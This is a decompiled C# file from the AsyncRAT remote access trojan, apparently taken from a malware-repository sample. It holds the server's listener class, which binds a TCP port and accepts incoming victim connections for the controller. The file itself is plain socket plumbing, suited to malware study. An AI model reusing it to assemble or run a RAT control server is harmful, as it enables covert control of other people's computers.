// Decompiled with JetBrains decompiler
// Type: Server.Connection.Listener
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Handle_Packet;
using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Server.Connection
{
  internal class Listener
  {
    private Socket Server { get; set; }

    public void Connect(object port)
    {
      try
      {
        IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
        this.Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
          SendBufferSize = 51200,
          ReceiveBufferSize = 51200
        };
        this.Server.Bind((EndPoint) localEP);
        this.Server.Listen(500);
        new HandleLogs().Addmsg(string.Format("Listenning {0}", port), Color.Green);
        this.Server.BeginAccept(new AsyncCallback(this.EndAccept), (object) null);
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
        Environment.Exit(0);
      }
    }

    private void EndAccept(IAsyncResult ar)
    {
      try
      {
        Clients clients = new Clients(this.Server.EndAccept(ar));
      }
      catch
      {
      }
      finally
      {
        this.Server.BeginAccept(new AsyncCallback(this.EndAccept), (object) null);
      }
    }
  }
}
